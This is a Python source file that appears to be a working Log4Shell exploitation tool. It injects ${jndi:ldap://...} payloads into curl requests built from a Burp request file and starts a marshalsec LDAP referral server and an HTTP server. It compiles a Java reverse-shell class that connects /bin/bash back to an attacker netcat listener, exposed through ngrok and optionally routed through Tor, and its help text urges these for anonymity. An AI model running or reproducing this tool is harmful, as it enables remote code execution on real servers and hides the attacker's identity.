#!/usr/bin/env python3

import subprocess
import os
import shlex
import json
import time
import urllib.request
import concurrent.futures
import socket
import argparse
from sys import prefix
from async_timeout import timeout
from git import Repo
from py import process

class start_LDAP_Server():

    def __init__(self, cmd, path):
        self.cmd = cmd
        self.path = path
        self.stop_control = False
        self.forward_progress = False
        self.msg = ""
        self.pid = None

    def __del__(self):
        if hasattr(self, "proc"):
            self.proc.terminate()
            self.proc.kill()
            self.proc.send_signal(subprocess.signal.SIGKILL)
            end()

    def clear(self):
        try:
            self.proc = subprocess.run("mvn clean package -DskipTests", shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(e)
        return

    def getpid(self):
        return self.proc.pid

    def wait(self):
        while not self.forward_progress:
            time.sleep(3)
        return

    def run(self):
        os.chdir(self.path)
        if (os.path.isfile(self.path + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
            os.chdir(self.path)
            self.cmd = self.cmd
            try:
                self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
                running_process.append(self.proc.pid)
                while True:
                    output = self.proc.stdout.readline()
                    if output == '' and self.proc.poll() is not None:
                        break
                    elif output.strip().decode() == 'Listening on 0.0.0.0:1389':
                        print(output.strip().decode())
                        print("Waiting for commands...")
                        self.forward_progress = True
                    elif 'Send LDAP reference result for' in output.strip().decode():
                        self.msg = output.strip().decode()
                        self.stop_control = True
                        print("\nLDAP server received:")
                        print(output.strip().decode())
                self.proc.poll()
            except:
                pass
        else:
            print ('Cleaning package...')
            self.clear()
            self.run()
        return

class HTTP:
    def __init__(self, port_http_server):
        self.port = port_http_server

    def __del__(self):
        if hasattr(self, "proc"):
            try:
                self.proc.terminate()
                self.proc.kill()
                self.proc.send_signal(subprocess.signal.SIGKILL)
            except:
                pass
    
    def run(self):
        self.proc = subprocess.run('exo-open --launch TerminalEmulator python3 -m http.server ' + port_http_server + ' --directory ' + abs_path + path_http_server + ' &', shell=True)
        return

def end():
    global running_process
    os.system("kill -9 $(ps aux | grep 'http.server' | awk 'NR==1{ print $2 }')")
    for pid in running_process:
        os.system("kill -9 " + str(pid))
    os.system("kill -9 " + str(os.getpid()))

def clear_process():
    p = subprocess.run("kill -9 $(ps aux | grep 'marshalsec.jndi.LDAPRefServer' | grep 'SNAPSHOT' | awk 'NR==1{ print $2 }')", shell=True, capture_output=True, text=True)
    if (p.returncode == 0):
        return clear_process()
    else:
        return

# def wait(ldap_server):
#     while not ldap_server.forward_progress:
#         time.sleep(3)
#     return

def execute(list_cmd, process):
    os.chdir(abs_path)
    process.wait()
    list_code= []
    for cmd, code in list_cmd:
        time.sleep(3)
        if not process.stop_control:
            list_code.append(code)
            print("\nSending to victim:\n" + cmd)
            subprocess.run(shlex.split(cmd))
        else:
            msg = process.msg
            break
    
    result_code = msg.split("Send LDAP reference result for ")[1].split(' ')[0]
    if result_code in list_code:
        cmd = list_cmd[list_code.index(result_code)][0]
        print("\n\nFound command:\n\n" + cmd)
        cmd = cmd.replace('/' + result_code + '}', '/#' + name_file + '}')
        print("\nSending:\n" + cmd)
        b = subprocess.run(shlex.split(cmd))
        running_process.append(b.pid)
        #end()
    else:
        print('Command not found in list')

def ngrok_start():
    global use_tor
    os.chdir(abs_path + '/ngrok_tunnel')
    if use_tor:
        cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel_tor.yml'
    else:
        cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel.yml'
    subprocess.run(shlex.split(cmd))
    time.sleep(2)
    return

def ngrok_get():
    try:
        time.sleep(2)
        contents = urllib.request.urlopen("http://localhost:4040/api/tunnels").read()
        result = json.loads(contents.decode())
        if len(result['tunnels']) == 0:
            return ngrok_get()
    except:
        return ngrok_get()
        
    return result

def ngrok_verify_file():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    return os.path.isfile(path + path_ngrok + '/tunnel.yml')

def ngrok_verify_file_tor():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    return os.path.isfile(path + path_ngrok + '/tunnel_tor.yml')

def ngrok_verify():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    if not (os.path.isdir(path + path_ngrok)):
        os.makedirs(path + "/" + path_ngrok)

def ngrok_create(auth_token, port_http_server, port_ldap_server):
    string_ngrok = "authtoken: " + auth_token + ";tunnels:;  first:;    addr: " + port_http_server + ";    proto: http;  second:;    addr: " + port_ldap_server + ";    proto: tcp;  third:;    addr: " + port_nc_server + ";    proto: tcp;"
    tor_string = 'socks5_proxy: "socks5://127.0.0.1:' + port_tor_tunnel + '";'
    string_ngrok_tor = "authtoken: " + auth_token + ";" + tor_string + "tunnels:;  first:;    addr: " + port_http_server + ";    proto: http;  second:;    addr: " + port_ldap_server + ";    proto: tcp;  third:;    addr: " + port_nc_server + ";    proto: tcp;"
    print("Removing tunnel.yml and tunnel_tor if exists")
    try:
        os.system('rm ngrok_tunnel/tunnel.yml')
        os.system('rm ngrok_tunnel/tunnel_tor.yml')
        print("Removed ngrok_tunnel/tunnel.yml and ngrok_tunnel/tunnel_tor.yml")
    except subprocess.CalledProcessError:
        print("File ngrok_tunnel/tunnel.yml or ngrok_tunnel/tunnel_tor.yml not exist")

    f = open(abs_path + '/ngrok_tunnel/tunnel.yml', "w")
    for i in string_ngrok.split(';'):
        f.write(i + '\n')
    f.close()

    f = open(abs_path + '/ngrok_tunnel/tunnel_tor.yml', "w")
    for i in string_ngrok_tor.split(';'):
        f.write(i + '\n')
    f.close()

def git_clone():
    git_url= 'https://github.com/mbechler/marshalsec.git'
    path = os.getcwd()
    if not (os.path.isdir(path + path_ldap_server)):
        os.makedirs(path + "/" + path_ldap_server.split('/')[1])
        Repo.clone_from(git_url, path + path_ldap_server)

def ncat():
    cmd = 'exo-open --launch TerminalEmulator nc -lnvp ' + port_nc_server + ' &'
    subprocess.run(cmd, shell=True)
    return

def readfile(burp_file):
    global vuln_server, method, headers, data, protocol
    os.chdir(abs_path)
    headers_end = False
    headers = []
    data = []
    try:
        f = open(burp_file, "r")
        lines = f.readlines()
        
        for line in lines:
            if lines.index(line) == 0:
                line = line.strip("\n")
                method = line.split(" ")[0]
                sufix_host = line.split(" ")[1]
                type = line.split(" ")[2].split('/')[1]
                protocol = (line.split(" ")[2].split("/")[0]).lower()
                if protocol == 'http' and type == '2':
                    protocol = 'https'
                elif protocol == 'http' and type == '1':
                    pass
            elif "Host" in line:
                prefix_host = line.strip("\n").split(": ")[1]
            elif line == '\n':
                headers_end = True
            elif line != '' and line != '\n' and not headers_end:
                headers.append(line.strip("\n"))
            elif line != '' and line != '\n' and headers_end:
                data.append(line.strip("\n"))
        
        vuln_server = protocol + '://' + prefix_host + sufix_host
        f.close()
        commands = prepare_list_commands()
        return commands
    except:
        print("Error at loading file")
        end()

def check(list):
    for l in list:
        if "*" in l:
            return True
    return False

def prepare_list_commands():
    global use_tor, port_tor_tunnel, method, vuln_server, headers, data, host_tcp, port_ldap_server
    
    def create_header(h):
        str_head = ' '
        for i in h:
            str_h = '-H "' + i + '" '
            str_head = str_head + str_h
        return str_head

    string_tor = ' '
    str_header = create_header(headers)
    if len(data):
        str_d = '-d ' + data[0]
    else:
        str_d = ""
    if use_tor:
        string_tor = ' --proxy socks5://127.0.0.1:' + port_tor_tunnel + ' '
    terminate = False
    count = 0
    commands = []
    while True:
        count += 1
        varcode = "{:05d}".format(count)
        str_injection_1 = '\${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
        str_injection_2 = '${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
        if "*" in vuln_server:
            vuln_server = vuln_server.replace("*", str_injection_1)
            commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server + ' -s -k -L', varcode))
        elif len(headers) > 0 and check(headers) and not terminate:
            for i in headers:
                if "*" in i and not "*/*" in i:
                    index = headers.index(i)
                    i = i.replace("*", str_injection_1)
                    headers[index] = i
                    str_header = create_header(headers)
                    commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server + ' -s -k -L', varcode))
                    i = i.replace(str_injection_1, "*")
                    headers[index] = i
            str_header = create_header(headers)
            terminate = True
        elif len(data) > 0 and "*" in data[0]:
            count = data[0].count("*")
            for i in range(count):
                str_data = '\'' + str_d.replace("*", str_injection_2, i + 1) + '\''
                if count <= (i + 1):
                    str_data = str_data.replace(str_injection_2, "*", count - i)
                commands.append(('curl' + string_tor + '-X ' + method + str_header + str_data + ' ' + vuln_server + ' -s -k -L', varcode))
            break
        else:
            #terminate = True
            break
    
    return commands

def compile_java(java_file):
    os.chdir(abs_path + path_http_server)
    command = 'javac -verbose ' + java_file
    cmd = command.split(" ")
    os.spawnlp(os.P_WAIT, *cmd)
    print("File " + java_file + " compiled")
    os.chdir(abs_path)
    return

def create_class_java():
    global port_nc_ngrok, host_nc
    string_class_java = 'import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class ' + name_file + ' {  public ' + name_file + '() throws Exception {    String host="' + host_nc + '";    int port=' + port_nc_ngrok + ';    String cmd="/bin/bash";    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();    Socket s=new Socket(host,port);    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();    OutputStream po=p.getOutputStream(),so=s.getOutputStream();    while(!s.isClosed()) {      while(pi.available()>0)        so.write(pi.read());      while(pe.available()>0)        so.write(pe.read());      while(si.available()>0)        po.write(si.read());      so.flush();      po.flush();      Thread.sleep(50);      try {        p.exitValue();        break;      }      catch (Exception e){      }    };    p.destroy();    s.close();  }}'
    string = string_class_java.split(";")
    if not (os.path.isdir(abs_path + path_http_server)):
        os.makedirs(abs_path + path_http_server)
    f = open(abs_path + path_http_server + '/' +  name_file + ".java", "w")
    for i in string:
        if '{' in i:
            w = i.split("{")
            for s in w:
                if '}' in i:
                    t = s.split("}")
                    for h in t:
                        if t.index(h) != len(t) - 1:
                            if w.index(s) == len(w) - 1:
                                f.write(h + '};\n')
                            else:
                                print(h)
                                f.write(h + '}\n')
                        else:
                            if w.index(s) != len(w) - 1:
                                f.write(h + '{\n')
                else:
                    if w.index(s) != len(w) - 1:
                        f.write(s + '{\n')
                    else:
                        f.write(s + ';\n')
        else:
            if not i == '':
                f.write (i + ';\n')

    f.close()
    compile_java(name_file + ".java")

def to_process():
    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path, host_http_ngrok, port_nc_ngrok, protocol

    with concurrent.futures.ThreadPoolExecutor() as executor:
        time.sleep(1)
        p0 = executor.submit(clear_process,)
        port = ":" + port_http_server
        host_http_ngrok = host_http
        if use_ngrok:
            try:
                p1 = executor.submit(ngrok_start,)
                p1.result(timeout=5)
            except concurrent.futures.TimeoutError:
                pass
            p2 = executor.submit(ngrok_get,)
            result = p2.result()
            for a in result['tunnels']:
                if a['proto'] == protocol:
                    host_http_ngrok = a['public_url'].split('//')[1]
                elif a['proto'] == 'tcp':
                    pt = a['config']['addr'].split(':')[1]
                    if pt == port_nc_server:
                        host_nc = a['public_url'].split('//')[1].split(':')[0]
                        port_nc_ngrok = a['public_url'].split(':')[2]
                    elif pt == port_ldap_server:
                        host_tcp = a['public_url'].split('//')[1].split(':')[0]
                        port_ldap_server = a['public_url'].split(':')[2]
            port = ""
        else:
            pass
        
        create_class_java()

        commands = []
        if burp_file:
            commands = readfile(burp_file)

        http_server = HTTP(port_http_server)

        if use_ncat:
            try:
                p5 = executor.submit(http_server.run, )
                p5.result(timeout=5)
            except concurrent.futures.TimeoutError:
                pass

            p7 = executor.submit(ncat,)

        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "' + protocol + '://' + host_http_ngrok + port + '/#' + name_file +'"'
        print(command_server_ldap)
        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_server)
        if (os.path.isfile(abs_path + path_ldap_server + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
            timeout = 1
        else:
            timeout = 20
        try:
            p3 = executor.submit(ldap_server.run,)
            j = p3.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            pass
        
        # try:
        #     p4 = executor.submit(verify_server, ldap_server)
        #     progress = p4.result(timeout=30)
        # except concurrent.futures.TimeoutError:
        #     pass

        # if progress:
        #     pass
        # else:
        #     print("LDAP server loading error. Restart aplication.")
        #     end()
        p6 = executor.submit(execute, commands, ldap_server)

def initialize():
    
    try:
        os.system("kill -9 $(ps aux | grep 'http.server' | awk 'NR==1{ print $2 }')")
    except:
        pass
    git_clone()
    
    if use_ngrok:
        ngrok_verify()
        if recreate:
            if not auth_token:
                print("You must to use auth token for ngrok")
                exit(0)
            else:
                ngrok_create(auth_token, port_http_server, port_ldap_server )
        elif not ngrok_verify_file() or not ngrok_verify_file_tor():
                print("You must to use auth token for ngrok and recreate option")
                exit(0)

    to_process()

if __name__ == "__main__":
    running_process = []
    name_file = 'log4jRCE'
    hostname = socket.gethostname()
    host_http = socket.gethostbyname(hostname)
    host_http_ngrok = host_http
    host_tcp = host_http
    host_nc = host_tcp
    path_ldap_server = "/LDAP_Service/marshalsec"
    path_http_server = "/HTTP_Service"
    abs_path = os.getcwd()
    parser = argparse.ArgumentParser(
        description='Usage getrevlog4shell.py -v "proto://vulnerable.host" [options]',
        epilog='You must use ngrok and tor options to maintain privacy.'
        )
    parser.add_argument("-v", "--vns", type=str, help="Host vulnerable")
    parser.add_argument("-a", "--auth", type=str, help="Ngrok authtoken")
    parser.add_argument("-ngku", "--use_ngrok", help="Use ngrok", action="store_true")
    parser.add_argument("-nc", "--use_ncat", help="Use ncat", action="store_true")
    parser.add_argument("-rctn", "--rec_ng_file", help="Recreate ngrok file tunnels", action="store_true")
    parser.add_argument("-pls", "--port_ldap_server", type=int, help="Port of ldap server")
    parser.add_argument("-phs", "--port_http_server", type=int, help="Port of http server")
    parser.add_argument("-pns", "--port_nc_listener", type=int, help="Port of ncat listener")
    parser.add_argument("-pts", "--port_tor_tunnel", type=int, help="Port of tor tunnel listener")
    parser.add_argument("-t", "--tor_proxy", help="Use tor proxy", action="store_true")
    parser.add_argument("-r", "--file", help="Burpsuit file")
    parser.add_argument("-d", "--data", help="Data")
    parser.add_argument("-H", "--headers", help="Headers")
    parser.add_argument("-X", "--method", help="Method", default="POST", choices=["GET", "POST"])
    args = parser.parse_args()

    port_ldap_server = '1389'
    port_http_server = '8000'
    port_nc_server = '4444'
    port_nc_ngrok = port_nc_server
    port_tor_tunnel = '9050'
    protocol = "http"
    use_ngrok = False
    recreate = False
    auth_token = None
    vuln_server = None
    use_tor = None
    method = "POST"
    data = []
    headers = []
    burp_file = None

    if args.port_ldap_server: port_ldap_server = str(args.port_ldap_server).replace(" ", "")
    if args.port_http_server: port_http_server = str(args.port_http_server).replace(" ", "")
    if args.port_nc_listener: port_nc_server = str(args.port_nc_listener).replace(" ", "")
    if args.port_tor_tunnel: port_tor_tunnel = str(args.port_tor_tunnel).replace(" ", "")
    if args.use_ngrok: use_ngrok = args.use_ngrok
    if args.rec_ng_file: recreate = args.rec_ng_file
    if args.auth: auth_token = args.auth.replace(" ", "")
    if args.vns: vuln_server = args.vns.replace(" ", "")
    if args.tor_proxy: use_tor = args.tor_proxy
    if args.file: burp_file = args.file.replace(" ", "")
    if args.data: data = [args.data]
    if args.headers: headers = args.headers
    if args.method: method = args.method
    if args.use_ncat: use_ncat = args.use_ncat

    if not vuln_server and not burp_file:
        parser.print_help()
        print('Use burpfile ou enter request.')
        exit(0)
    elif burp_file:
        pass
    else:
        if not '*' in vuln_server:
            if check(data):
                pass
            elif check(headers):
                pass
            else:
                parser.print_help()
                print('Set location testing with param <*>.')
                exit(0)
    
    try:
        initialize()
    except KeyboardInterrupt:
        end()